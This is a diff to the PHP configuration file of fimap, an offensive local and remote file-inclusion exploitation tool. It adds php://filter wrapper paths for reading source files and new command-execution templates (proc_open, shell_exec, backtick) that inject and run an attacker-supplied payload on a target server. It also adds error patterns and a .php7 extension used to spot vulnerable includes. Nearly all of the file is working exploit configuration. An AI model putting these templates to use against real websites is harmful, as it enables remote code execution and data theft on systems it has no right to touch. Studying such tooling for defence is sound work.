@@ -1,18 +1,17 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <fimap language="php" revision="4" force_inclusion_test="0" autor="Iman Karim (imax@tha-imax.de)" >
-	<snipe regex="Failed opening( required)* '(?P&lt;incname&gt;[\d\w/\.\-:\\]*?%s[\d\w/\.\-\\]*?)' (for inclusion)*" />
-	
+	<snipe regex="Failed to open stream:* '(?P&lt;incname&gt;[\d\w/\.\-:\\]*?%s[\d\w/\.\-\\]*?)' (for inclusion)*" />
+
 	<relative_files>
 	</relative_files>
 	
 	<absolute_files>
-		<file path="php://input" post="__QUIZ__" find="__ANSWER__" flags="rxP"  unix="1" windows="1"/>
+	  <file path="php://filter/convert.base64-encode/resource=" post="__QUIZ__" find="__ANSWER__" flags="rxP"  unix="1" windows="1"/>
+	  <file path="php://filter/convert.quoted-printable-encode/resource=" post="__QUIZ__" find="__ANSWER__" flags="rxP"  unix="1" windows="1"/>
+	  <file path="php://filter/string.rot13/resource=" post="__QUIZ__" find="__ANSWER__" flags="rxP"  unix="1" windows="1"/>
+	  <file path="php://filter/string.tolower/resource=" post="__QUIZ__" find="__ANSWER__" flags="rxP"  unix="1" windows="1"/>
 	</absolute_files>
-	
-	<remote_files>
-		<file path="http://www.tha-imax.de/fimap_testfiles/test" find="This is the right thing." flags="rR"  unix="1" windows="1"/>
-	</remote_files>
-	
+		
 	<log_files>
 	</log_files>
 	
@@ -25,6 +24,9 @@
 		<exec unix="1" win="0" dobase64="0" name="passthru" 	 source='&lt;?php passthru ("__PAYLOAD__". " 2&gt;&amp;1"); ?&gt;' />
 		<exec unix="1" win="0" dobase64="0" name="exec"     	 source='&lt;?php exec("__PAYLOAD__". " 2&gt;&amp;1", $arr); $data = join("\n", $arr); echo $data; ?&gt;' />
 		<exec unix="1" win="0" dobase64="0" name="system"    	 source='&lt;?php system ("__PAYLOAD__". " 2&gt;&amp;1"); ?&gt;' />
+		<exec unix="1" win="0" dobase64="0" name="proc_open"    	 source='&lt;?php proc_open ("__PAYLOAD__". " 2&gt;&amp;1"); ?&gt;' />
+		<exec unix="1" win="0" dobase64="0" name="shell_exec"    	 source='&lt;?php shell_exec ("__PAYLOAD__". " 2&gt;&amp;1"); ?&gt;' />
+		<exec unix="1" win="0" dobase64="0" name="backtick_operator"    	 source='&lt;?php `"__PAYLOAD__". " 2&gt;&amp;1"`; ?&gt;' />
 		
 		<exec unix="0" win="1" dobase64="1" name="popen[b64][win]"    source='&lt;?php $h=popen(base64_decode("__PAYLOAD__") , "r");while(!feof($h)){$l=fread($h, 2024);echo $l;}?&gt;' />
 		<exec unix="0" win="1" dobase64="1" name="passthru[b64][win]" source='&lt;?php passthru (base64_decode("__PAYLOAD__")); ?&gt;' />
@@ -34,6 +36,8 @@
 		<exec unix="0" win="1" dobase64="0" name="passthru[win]"      source='&lt;?php passthru ("__PAYLOAD__"); ?&gt;' />
 		<exec unix="0" win="1" dobase64="0" name="exec[win]"          source='&lt;?php exec ("__PAYLOAD__", $arr); $data = join("\n",$arr); echo $data; ?&gt;' />
 		<exec unix="0" win="1" dobase64="0" name="system[win]"        source='&lt;?php system ("__PAYLOAD__"); ?&gt;' />
+		<exec unix="0" win="1" dobase64="0" name="proc_open[win]"    	 source='&lt;?php proc_open ("__PAYLOAD__"); ?&gt;' />
+		<exec unix="0" win="1" dobase64="0" name="shell_exec[win]"    	 source='&lt;?php shell_exec ("__PAYLOAD__"); ?&gt;' />
 	</exec_methods> 
 	
 	<payloads>
@@ -72,6 +76,8 @@
 			<pattern regex="&lt;b&gt;Warning&lt;/b&gt;:  read_file(.*?%s.*?)*" />
 			<pattern regex="&lt;b&gt;Warning&lt;/b&gt;:  highlight_file(.*?%s.*?)*" />
 			<pattern regex="&lt;b&gt;Warning&lt;/b&gt;:  show_source(.*?%s.*?)*" />
+			<pattern regex="&lt;b&gt;Warning&lt;/b&gt;:  file_get_contents(.*?%s.*?)*" />
+			<pattern regex="&lt;b&gt;Warning&lt;/b&gt;:  fpassthru(fopen(.*?%s.*?), 'rb')*" />
 		</readfile_patterns>
 		
 		<extentions>
@@ -79,6 +85,7 @@
 			<extention ext=".php3" />
 			<extention ext=".php4" />
 			<extention ext=".php5" />
+			<extention ext=".php7" />
 			<extention ext=".phtml" />
 		</extentions>
 	</detectors>
